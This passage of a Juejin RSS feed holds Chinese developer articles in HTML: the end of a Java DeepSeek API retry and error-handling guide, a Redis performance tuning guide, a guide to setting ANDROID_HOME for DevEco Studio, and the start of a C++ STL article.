            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 调用API的逻辑</span>
                <span class="hljs-type">DeepSeekApiClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeepSeekApiClient</span>();
                <span class="hljs-keyword">return</span> client.callDeepSeek(prompt);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                retryCount++;
                <span class="hljs-type">String</span> <span class="hljs-variable">errorMsg</span> <span class="hljs-operator">=</span> DeepSeekErrorHandler.getErrorMsg(e);
                System.err.println(<span class="hljs-string">"第"</span> + retryCount + <span class="hljs-string">"次调用失败："</span> + errorMsg);

                <span class="hljs-comment">// 不该重试就直接退出</span>
                <span class="hljs-keyword">if</span> (!DeepSeekErrorHandler.needRetry(e)) {
                    <span class="hljs-keyword">break</span>;
                }

                <span class="hljs-comment">// 指数退避重试：第1次等2秒，第2次等4秒，第3次等8秒</span>
                <span class="hljs-keyword">try</span> {
                    Thread.sleep((<span class="hljs-type">long</span>) (Math.pow(<span class="hljs-number">2</span>, retryCount) * <span class="hljs-number">1000</span>));
                } <span class="hljs-keyword">catch</span> (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    <span class="hljs-keyword">break</span>;
                }
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"choices\":[{\"message\":{\"content\":\"试了好几次都不行，稍后再试吧~\"}}]}"</span>;
    }
}
</code></pre>
<h2 data-id="heading-34">九、总结与最佳实践</h2>
<p>本文拆解了 Java 调用 DeepSeek API 的 8 个高频错误，从 Token 管理、并发安全、超长文本处理到跨模型适配，核心避坑思路可总结为：</p>
<h3 data-id="heading-35">1. 鉴权层：主动防御 + 被动兜底</h3>
<ul>
<li>避免硬编码 Token，对接配置中心实现动态刷新；</li>
<li>结合主动刷新（提前检测有效期）和被动刷新（捕获 401 异常），保证 Token 有效性；</li>
<li>增加降级策略，Token 刷新失败时临时延长有效期，避免服务中断。</li>
</ul>
<h3 data-id="heading-36">2. 并发层：隔离 + 安全</h3>
<ul>
<li>配置 HTTP 连接池，限制最大连接数，避免端口耗尽；</li>
<li>使用专用线程池隔离 API 调用，合理设置核心线程数、队列大小和拒绝策略；</li>
<li>每个请求独立创建非线程安全对象（如 HttpHeaders、HashMap），杜绝数据错乱。</li>
</ul>
<h3 data-id="heading-37">3. 文本层：精准计算 + 语义分块</h3>
<ul>
<li>使用专业 Token 计算库，避免按字符数分割导致的误差；</li>
<li>优先按句子分块，保留语义完整性，极端情况按 Token 切割；</li>
<li>分块调用时添加上下文标识，提升回复质量，最后拼接结果。</li>
</ul>
<h3 data-id="heading-38">4. 适配层：兼容差异 + 动态调整</h3>
<ul>
<li>按模型类型适配超时时间、请求参数，过滤不支持的参数；</li>
<li>适配错误码处理逻辑，针对不同错误码制定差异化重试策略；</li>
<li>解析响应时兼容字段差异，避免解析异常。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis性能提升50%的7个关键配置：从慢查询优化到内存碎片整理实战指南]]></title>    <link>https://juejin.cn/post/7581423932613820456</link>    <guid>https://juejin.cn/post/7581423932613820456</guid>    <pubDate>2025-12-09T04:16:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581423932613820456" data-draft-id="7581423932613804072" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis性能提升50%的7个关键配置：从慢查询优化到内存碎片整理实战指南"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-12-09T04:16:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis性能提升50%的7个关键配置：从慢查询优化到内存碎片整理实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:16:52.000Z" title="Tue Dec 09 2025 04:16:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Redis性能提升50%的7个关键配置：从慢查询优化到内存碎片整理实战指南</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>Redis作为高性能的内存数据库，广泛应用于缓存、消息队列、实时统计等场景。然而，随着业务规模的增长，Redis的性能瓶颈可能逐渐显现。通过合理的配置和优化，可以显著提升Redis的性能表现。本文将深入探讨7个关键配置优化点，涵盖慢查询优化、内存管理、网络调优等方面，帮助你将Redis性能提升50%甚至更高。</p>
<h2 data-id="heading-2">主体</h2>
<h3 data-id="heading-3">1. 慢查询分析与优化</h3>
<p>慢查询是Redis性能的“隐形杀手”。默认情况下，Redis会记录执行时间超过10毫秒的命令（可通过<code>slowlog-log-slower-than</code>调整）。优化建议：</p>
<ul>
<li><strong>动态调整阈值</strong>：根据业务特点设置合理的慢查询阈值（例如调整为5ms）。</li>
<li><strong>定期分析慢日志</strong>：使用<code>SLOWLOG GET</code>命令获取慢查询记录，重点关注高频命令（如<code>KEYS *</code>、复杂Lua脚本）。</li>
<li><strong>替换低效命令</strong>：例如用<code>SCAN</code>替代<code>KEYS *</code>，避免阻塞其他请求。</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 配置示例</span>
config <span class="hljs-built_in">set</span> slowlog-log-slower-than 5000  <span class="hljs-comment"># 5毫秒</span>
config <span class="hljs-built_in">set</span> slowlog-max-len 1000          <span class="hljs-comment"># 保留1000条记录</span>
</code></pre>
<h3 data-id="heading-4">2. 内存分配策略与碎片整理</h3>
<p>Redis的内存碎片问题会降低内存利用率并增加延迟。关键配置：</p>
<ul>
<li><strong>启用主动碎片整理</strong>：通过<code>activedefrag yes</code>开启（需Redis 4.0+），并调整触发阈值：
<pre><code class="hljs language-bash" lang="bash">config <span class="hljs-built_in">set</span> activedefrag <span class="hljs-built_in">yes</span>
config <span class="hljs-built_in">set</span> active-defrag-ignore-bytes 100mb     <span class="hljs-comment"># 碎片超过100MB时触发</span>
config <span class="hljs-built_in">set</span> active-defrag-threshold-lower 10     <span class="hljs-comment"># 碎片占比10%开始整理</span>
</code></pre>
</li>
<li><strong>选择合适的内存分配器</strong>：默认使用jemalloc，可通过<code>INFO memory</code>验证。对于高并发场景，可尝试调整jemalloc的参数（如<code>MALLOC_CONF=lg_dirty_mult:3</code>）。</li>
</ul>
<h3 data-id="heading-5">3. AOF持久化优化</h3>
<p>AOF日志虽能保证数据安全，但可能成为性能瓶颈。优化方向：</p>
<ul>
<li><strong>调整fsync策略</strong>：从默认的<code>everysec</code>改为<code>no</code>（牺牲部分安全性换取性能）或使用操作系统缓存（Linux默认30秒刷盘）。</li>
<li><strong>启用AOF重写压缩</strong>：通过<code>auto-aof-rewrite-percentage</code>和<code>auto-aof-rewrite-min-size</code>控制重写频率。</li>
<li><strong>混合持久化（RDB+AOF）</strong>：Redis 4.0+支持，结合两者优势：
<pre><code class="hljs language-bash" lang="bash">aof-use-rdb-preamble <span class="hljs-built_in">yes</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-6">4. TCP网络参数调优</h3>
<p>Redis的网络性能直接影响吞吐量。关键配置：</p>
<ul>
<li><strong>调整TCP backlog</strong>：默认值511可能不足，建议根据连接数调整（需同时修改OS的<code>somaxconn</code>）：
<pre><code class="hljs language-bash" lang="bash">config <span class="hljs-built_in">set</span> tcp-backlog 2048
</code></pre>
</li>
<li><strong>启用TCP快速打开（TFO）</strong>：减少连接建立延迟（需内核支持）：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'net.ipv4.tcp_fastopen = 3'</span> &gt;&gt; /etc/sysctl.conf
</code></pre>
</li>
</ul>
<h3 data-id="heading-7">5. Key淘汰策略与LRU算法优化</h3>
<p>当内存不足时，淘汰策略直接影响性能。推荐做法：</p>
<ul>
<li><strong>选择高效策略</strong>：优先使用<code>volatile-lru</code>或<code>allkeys-lru</code>而非随机淘汰。</li>
<li><strong>调整LRU采样精度</strong>：通过<code>maxmemory-samples</code>控制（默认5），增加采样数可提高准确性但消耗更多CPU。</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">config <span class="hljs-built_in">set</span> maxmemory-policy allkeys-lru
config <span class="hljs-built_in">set</span> maxmemory-samples 10
</code></pre>
<h3 data-id="heading-8">6. Pipeline与批量操作</h3>
<p>减少网络往返次数是提升吞吐量的核心方法之一。实践建议：</p>
<ul>
<li><strong>Pipeline批处理</strong>：将多个命令合并为一次请求（注意单次Pipeline不宜过大）。示例代码（Python）：</li>
</ul>
<pre><code class="hljs language-python" lang="python">pipe = r.pipeline()
<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:
    pipe.get(key)
results = pipe.execute()
</code></pre>
<ul>
<li><strong>大Key拆分</strong>：避免单个Value过大（如超过1MB），可改用Hash分片存储。</li>
</ul>
<h3 data-id="heading-9">7.  客户端连接池与多线程优化</h3>
<p>高并发场景下连接管理至关重要：</p>
<ul>
<li>合理设置连接池大小 （如Java的JedisPool） ，避免频繁创建销毁连接。</li>
<li>Redis  6 .0 +的多线程I/O ：通过io-threads启用多线程处理网络请求 （不涉及命令执行） ：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">io-threads  4              <span class="hljs-comment">#  建议为CPU核数的70%左右 </span>
io-threads-do-reads <span class="hljs-built_in">yes</span>    <span class="hljs-comment">#  启用读多线程 </span>
</code></pre>
<h2 data-id="heading-10">总结</h2>
<p>通过以上7个关键维度的优化 ——从慢查询分析 、内存碎片整理到网络参数调优 ——可以显著提升Redis的性能表现 。实际部署时需结合监控工具 （如Redis自带的INFO命令 、Prometheus + Grafana ）持续观察效果 ，并根据业务特点灵活调整参数 。记住 ，没有放之四海而皆准的最优配置 ，只有最适合当前场景的权衡取舍 。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ANDROID_HOME not set. Set the environment variable. Then, close DevEco Studio an]]></title>    <link>https://juejin.cn/post/7581619505585029171</link>    <guid>https://juejin.cn/post/7581619505585029171</guid>    <pubDate>2025-12-09T04:45:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505585029171" data-draft-id="7581363652781260810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ANDROID_HOME not set. Set the environment variable. Then, close DevEco Studio an"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-09T04:45:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90后晨仔"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ANDROID_HOME not set. Set the environment variable. Then, close DevEco Studio an
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90后晨仔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:45:24.000Z" title="Tue Dec 09 2025 04:45:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这个错误提示说明你的系统环境变量中没有设置 <code>ANDROID_HOME</code>，而 DevEco Studio（华为的集成开发环境）在构建或运行项目时需要它来定位 Android SDK 的路径。</p>
<p>以下是设置 <code>ANDROID_HOME</code> 环境变量的方法，根据你的操作系统不同略有差异：</p>
<hr/>
<h3 data-id="heading-0">✅ <strong>Windows 系统</strong></h3>
<ol>
<li>
<p><strong>找到你的 Android SDK 路径</strong><br/>
通常位于：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">C:\Users&lt;你的用户名&gt;\AppData\Local\Android\Sdk</span>
</code></pre>
<p>或者如果你是通过 DevEco 安装的，可能在：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">C:\Users&lt;你的用户名&gt;\AppData\Roaming\Huawei\DevEco Studio\sdk</span>
</code></pre>
</li>
<li>
<p><strong>设置环境变量</strong></p>
<ul>
<li>
<p>右键“此电脑” → “属性” → “高级系统设置” → “环境变量”</p>
</li>
<li>
<p>在“系统变量”区域，点击“新建”</p>
<ul>
<li>变量名：<code>ANDROID_HOME</code></li>
<li>变量值：你的 Android SDK 路径（例如 <code>C:\Users\YourName\AppData\Local\Android\Sdk</code>）</li>
</ul>
</li>
<li>
<p>同时确保 <code>Path</code> 环境变量中包含：</p>
<pre><code class="hljs language-perl" lang="perl">%ANDROID_HOME%\tools
%ANDROID_HOME%\platform-tools
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>重启 DevEco Studio</strong><br/>
关闭后重新打开，让环境变量生效。</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-1">✅ <strong>macOS / Linux</strong></h3>
<ol>
<li>
<p><strong>找到 Android SDK 路径</strong><br/>
常见路径如：</p>
<pre><code class="hljs language-javascript" lang="javascript">~<span class="hljs-regexp">/Library/</span><span class="hljs-title class_">Android</span>/sdk          # macOS 默认
~<span class="hljs-regexp">/Android/</span><span class="hljs-title class_">Sdk</span>                  # <span class="hljs-title class_">Linux</span> 或自定义
~<span class="hljs-regexp">/.huawei/</span>devcloud/sdk         # 华为 <span class="hljs-title class_">DevEco</span> 可能使用的位置
</code></pre>
</li>
<li>
<p><strong>编辑 shell 配置文件</strong><br/>
根据你使用的 shell（bash/zsh），编辑对应配置文件：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 如果是 zsh（macOS Catalina 及以后默认）</span>
nano ~/.zshrc

<span class="hljs-comment"># 如果是 bash</span>
nano ~/.bashrc
</code></pre>
</li>
<li>
<p><strong>添加以下内容</strong>（替换为你的实际路径）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> ANDROID_HOME=<span class="hljs-variable">$HOME</span>/Library/Android/sdk
<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$ANDROID_HOME</span>/tools:<span class="hljs-variable">$ANDROID_HOME</span>/platform-tools
</code></pre>
</li>
<li>
<p><strong>使配置生效</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">source</span> ~/.zshrc    <span class="hljs-comment"># 或 source ~/.bashrc</span>
</code></pre>
</li>
<li>
<p><strong>关闭并重新打开 DevEco Studio</strong></p>
</li>
</ol>
<hr/>
<h3 data-id="heading-2">🔍 验证是否设置成功</h3>
<p>在终端（命令行）中执行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$ANDROID_HOME</span>
</code></pre>
<p>应输出你设置的 SDK 路径。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[学而时习之：C++中的标准模板库7]]></title>    <link>https://juejin.cn/post/7581381365493809206</link>    <guid>https://juejin.cn/post/7581381365493809206</guid>    <pubDate>2025-12-09T03:02:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581381365493809206" data-draft-id="7581381365493547062" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="学而时习之：C++中的标准模板库7"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2025-12-09T03:02:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="煤球王子"/> <meta itemprop="url" content="https://juejin.cn/user/4088439235949739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            学而时习之：C++中的标准模板库7
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4088439235949739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    煤球王子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:02:58.000Z" title="Tue Dec 09 2025 03:02:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
